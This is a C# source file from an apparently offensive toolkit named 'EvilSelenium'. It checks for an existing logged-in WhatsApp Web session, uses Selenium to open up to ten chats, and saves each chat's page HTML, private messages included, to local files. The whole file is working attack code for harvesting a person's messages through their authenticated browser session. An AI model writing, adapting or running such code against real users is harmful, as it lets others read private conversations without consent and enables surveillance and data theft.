using System;
using OpenQA.Selenium;
using OpenQA.Selenium.Interactions;
using System.Threading;
using System.IO;

namespace EvilSelenium.Misc
{
    class Whatsapp
    {

        public static void ExtractMessages(string saveToPath)
        {
            // Validate path
            string outPath = Helpers.VerifyPath(saveToPath);

            const string WHATSAPP = "https://web.whatsapp.com";
            const string AUTHELEMENT = "side"; // This element ID is found for authenticated users only

            if (Helpers.IsUserAuth(WHATSAPP, AUTHELEMENT))
            {
                Console.WriteLine("[+] User is authenticated to Whatsapp");
                IWebDriver driver = Helpers.InitDriver();
                driver.Navigate().GoToUrl(WHATSAPP);
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

                var chatList = driver.FindElements(By.CssSelector("div[role=\"row\"]"));
                //driver.FindElement(By.CssSelector("div[role=\"row\"]")).SendKeys(Keys.End);
                //Thread.Sleep(1000);

                Console.WriteLine("[+] Fetching chats");

                for (int i = 10; i > 0; i--)
                {
                    try
                    {
                        chatList[i].Click();
                        Thread.Sleep(3000); // Give time for the chat to load
                    }
                    catch (ArgumentOutOfRangeException ex)
                    {
                        Console.WriteLine("[!] No more chats");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }
                    catch (IndexOutOfRangeException ex)
                    {
                        Console.WriteLine("[!] No more chats");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }
                    catch (StaleElementReferenceException ex)
                    {
                        Console.WriteLine("[!] No more chats");
                        driver.Quit();
                        System.Environment.Exit(1);
                    }

                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                    string emailContent = (string)js.ExecuteScript("return document.body.innerHTML");
                    //Console.WriteLine(emailContent);
                    File.WriteAllText(outPath + @"\whatsapp" + i + ".html", emailContent);
                    driver.Navigate().Back();
                }

                driver.Quit();

            }
            else
            {
                Console.WriteLine("[-] User is not authenticated");
                System.Environment.Exit(-1);
            }
        }
    }
}
